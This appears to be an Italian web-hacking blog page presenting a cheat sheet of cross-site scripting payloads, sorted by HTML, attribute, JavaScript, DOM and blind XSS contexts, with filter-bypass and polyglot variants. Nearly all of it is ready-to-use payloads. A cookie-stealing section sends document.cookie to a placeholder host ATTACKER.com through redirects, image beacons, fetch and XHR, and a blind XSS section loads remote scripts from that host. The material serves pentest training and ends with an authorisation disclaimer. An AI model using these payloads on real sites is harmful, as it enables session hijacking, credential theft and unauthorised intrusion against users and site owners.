---
title: 'XSS Payload List: cheat sheet completa per context, bypass e blind XSS'
slug: xss-payload-list
description: >-
  Lista completa di payload XSS per HTML, attributi, JavaScript, DOM, Blind XSS
  e filter bypass: una cheat sheet pratica per pentest e bug bounty.
image: /xss-payload-list.webp
draft: false
date: 2026-03-29T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xss
  - xss-polyglot
---

Lista di riferimento per payload XSS categorizzati per context, tecnica e scopo. Da usare durante pentest e bug bounty per coprire sistematicamente i vettori più comuni e bypassare i filtri frequenti.

→ Torna alla guida principale,per scoprire cos'è xss e le sue varianti: [XSS Completo](https://hackita.it/articoli/xss)

***

## Payload Base per Proof of Concept

```javascript
<script>alert(document.domain)</script>
<script>alert(1)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<iframe onload=alert(1) src=about:blank>
```

***

## Payload per Context HTML Body

```javascript
// Tag script
<script>alert(document.domain)</script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

// Evento su img
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x oNErRoR=alert(1)>
<img/src=x/onerror=alert(1)>

// SVG
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload="alert(1)">
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=y>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">

// HTML5 event handlers
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>
<video autoplay oncanplay=alert(1) src=x>
<audio autoplay oncanplay=alert(1) src=x>

// Link JavaScript
<a href="javascript:alert(1)">X</a>
<a href=javascript:alert(1)>X</a>

// Object / Embed
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<iframe src="javascript:alert(document.domain)">

// Form
<form action=javascript:alert(1)><input type=submit>
<button formaction=javascript:alert(1)>X</button>

// Input events
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<input type="image" src=x onerror=alert(1)>
```

***

## Payload per Context Attributo HTML

Quando l'input finisce in un attributo HTML come `<input value="INPUT">`:

```javascript
// Chiudi attributo, chiudi tag, inietta
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>

// Aggiungi event handler nello stesso tag
" onmouseover="alert(1)
" onmouseover=alert(1) x="
" onfocus=alert(1) autofocus="
" onerror=alert(1) src=x "

// Chiudi tag e apri nuovo
"><img src=x onerror=alert(1)><"
'><script>alert(1)</script>
'><img src=x onerror=alert(1)>

// Chiudi solo attributo senza chiudere tag
" onmouseover="alert(1)" data-x="
```

***

## Payload per Context Stringa JavaScript

Quando l'input finisce in `<script>var x = 'INPUT';</script>`:

```javascript
// Single quote context
'; alert(1); //
'; alert(1);//
\'; alert(1);//
'-alert(1)-'
'/alert(1)//

// Double quote context
"; alert(1); //
\"; alert(1);//
"-alert(1)-"

// Backtick context (template literal)
`; alert(1); //
${alert(1)}

// Senza spazi
';alert(1)//
";alert(1)//

// Continua il flow originale
'; alert(1); var x='
```

***

## Payload per Context Event Handler

Quando l'input finisce in `<div onclick="func('INPUT')">`:

```javascript
// Chiudi stringa, chiudi funzione, aggiungi codice
'); alert(1); //
'); alert(1);//
')-alert(1)//

// Double quote
"); alert(1); //

// Aggiungi handler inline
x' onmouseover='alert(1)
x" onmouseover="alert(1)
```

***

## Payload per href / src

Quando l'input finisce in un attributo href o src:

```javascript
javascript:alert(1)
javascript:alert(document.domain)
javascript:void(alert(1))
javascript://comment%0Aalert(1)

// Encoding
&#106;avascript:alert(1)
java&#x73;cript:alert(1)
java\u0073cript:alert(1)

// Data URI
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

***

## Payload Senza Tag HTML (tag-free)

Utili quando l'input è in un context JS già aperto o il filtro strip tutti i tag:

```javascript
// Richiedono context JS già aperto
';alert(1)//
"-alert(1)-"
${alert(1)}
\u003cscript\u003ealert(1)\u003c/script\u003e
\x3cscript\x3ealert(1)\x3c/script\x3e
```

***

## Payload Senza Parentesi

Per filtri che bloccano `(` e `)`:

```javascript
// Template literals
alert`1`
alert`document.domain`

// throw
<svg/onload="window.onerror=alert;throw 1">
<img src=x onerror="window.onerror=alert;throw 1">

// Spread operator
alert?.`1`

// Constructor
[].constructor.constructor`alert\x281\x29`()
```

***

## Payload Senza Virgolette

```javascript
// Nessuna quote necessaria se il valore non ha spazi
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1) src=about:blank>

// Backtick come alternativa
<img src=x onerror=`alert(1)`>
```

***

## Payload Senza Spazi

```javascript
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0Asrc=x%0Aonerror=alert(1)>
<img/**/src=x/**/onerror=alert(1)>
```

***

## Payload con Encoding

### HTML Entities

```javascript
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

### URL Encoding

```javascript
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Double URL Encoding

```javascript
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Unicode

```javascript
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Base64 via eval

```javascript
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>
// atob decode di: alert(document.domain)
```

***

## Payload Polimorfici (Polyglot)

Funzionano in più contesti contemporaneamente:

```javascript
// Polyglot 1 — html body + attribute + js string
'"--><img src=x onerror=alert(1)>

// Polyglot 2 — js string + html
\';alert(1)//\';alert(1)//";alert(1)//";alert(1)//--></SCRIPT>">'><SCRIPT>alert(1)</SCRIPT>

// Polyglot 3 — completo (Gareth Heyes)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Polyglot 4 — per form/input context
"onclick=alert(1)//<input type=submit>
```

***

## Payload per Cookie Stealing

```javascript
// Redirect con cookie
<script>location='https://ATTACKER.com/c?'+document.cookie</script>

// Image beacon
<img src=x onerror="new Image().src='https://ATTACKER.com/c?'+document.cookie">

// Fetch silenzioso
<script>fetch('https://ATTACKER.com/c',{method:'POST',mode:'no-cors',body:document.cookie})</script>

// XHR
<script>var x=new XMLHttpRequest();x.open('GET','https://ATTACKER.com/c?'+document.cookie);x.send()</script>
```

***

## Payload per DOM XSS

```javascript
// In location.hash context
#<img src=x onerror=alert(1)>
#<svg/onload=alert(1)>
#javascript:alert(1)

// In eval context
'-alert(1)-'
;alert(1)//

// Per innerHTML
<img src=x onerror=alert(1)>
```

***

## Payload per Blind XSS

```javascript
// Callback su server esterno
<script src=https://ATTACKER.com/xss.js></script>
"><script src=https://ATTACKER.com/xss.js></script>
'><script src=https://ATTACKER.com/xss.js></script>

// Con event handler (se script bloccato)
"><img src=x onerror="var s=document.createElement('script');s.src='https://ATTACKER.com/xss.js';document.body.appendChild(s)">

// XSS Hunter
"><script src=//tuo-nome.xss.ht></script>
```

***

## Payload Legacy / Browser Specifici

```javascript
// IE - CSS expression
<div style="color:expression(alert(1))">
<img style="xss:expression(alert(1))">

// IE - < operator in attributes
<table><td background="javascript:alert(1)">

// Chrome/Firefox - animazione SVG
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

// Firefox vecchio - namespace
<math><mi//xlink:href=javascript:alert(1)>
```

***

## Tabella Riepilogativa per Context

| Context          | Payload Minimo                   | Note               |
| ---------------- | -------------------------------- | ------------------ |
| HTML body        | `<img src=x onerror=alert(1)>`   | Universale         |
| Attributo value  | `"><img src=x onerror=alert(1)>` | Chiudi quotes      |
| Attributo href   | `javascript:alert(1)`            | Diretto            |
| String JS single | `';alert(1)//`                   | Esci dalla stringa |
| String JS double | `";alert(1)//`                   | Esci dalla stringa |
| Event handler    | `');alert(1)//`                  | Chiudi funzione    |
| Template literal | `${alert(1)}`                    | Interpolazione     |
| URL hash DOM     | `#<svg/onload=alert(1)>`         | No server          |
| eval()           | `alert(1)`                       | Già in context JS  |
| SVG context      | `<svg/onload=alert(1)>`          | Namespace SVG      |

***

*Disclaimer: Usa questi payload solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato penale (art. 615-ter c.p.).*

Vuoi migliorare davvero le tue competenze offensive con un percorso **1:1**? Vai su [HackIta Formazione](https://hackita.it/servizi).\
Se invece vuoi testare la sicurezza della tua azienda con un assessment professionale, trovi tutto su [HackIta Servizi](https://hackita.it/servizi).\
Se questo contenuto ti è stato utile e vuoi supportare il progetto, puoi farlo su [HackIta Supporto](https://hackita.it/supporto).\
Per un approfondimento esterno utile anche lato difesa, vedi la [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
